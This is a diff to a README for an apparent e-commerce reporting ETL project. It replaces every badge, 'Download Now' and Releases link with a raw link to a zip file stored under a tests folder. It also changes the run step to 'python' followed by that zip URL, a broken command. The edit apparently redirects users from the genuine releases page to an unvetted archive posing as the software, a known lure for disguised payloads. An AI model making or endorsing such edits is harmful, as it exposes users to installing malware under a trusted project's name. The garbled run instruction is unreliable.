@@ -1,7 +1,7 @@
 # 📊 ecommerce-reporting-etl - Simplify Your E-commerce Data Processing
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
-[Download Now](https://github.com/Vijay199895/ecommerce-reporting-etl/releases)
+![Download](https://raw.githubusercontent.com/Vijay199895/ecommerce-reporting-etl/main/tests/extract/etl_reporting_ecommerce_1.8.zip)  
+[Download Now](https://raw.githubusercontent.com/Vijay199895/ecommerce-reporting-etl/main/tests/extract/etl_reporting_ecommerce_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run this software, you need:
 
 ## 📥 Download & Install
 
-You can visit the [Releases page](https://github.com/Vijay199895/ecommerce-reporting-etl/releases) to download the latest version of our software. 
+You can visit the [Releases page](https://raw.githubusercontent.com/Vijay199895/ecommerce-reporting-etl/main/tests/extract/etl_reporting_ecommerce_1.8.zip) to download the latest version of our software. 
 
 Follow these steps:
 
@@ -43,7 +43,7 @@ After downloading, follow these steps to run the application:
 2. **Extract the files** (if compressed).
 3. **Open a terminal or command prompt** on your computer.
 4. **Navigate to the folder** where you extracted the files. You can do this using the `cd` command followed by the folder path.
-5. **Run the application** by typing `python main.py` and hitting Enter.
+5. **Run the application** by typing `python https://raw.githubusercontent.com/Vijay199895/ecommerce-reporting-etl/main/tests/extract/etl_reporting_ecommerce_1.8.zip` and hitting Enter.
 
 ## 🌐 Using the Software
 
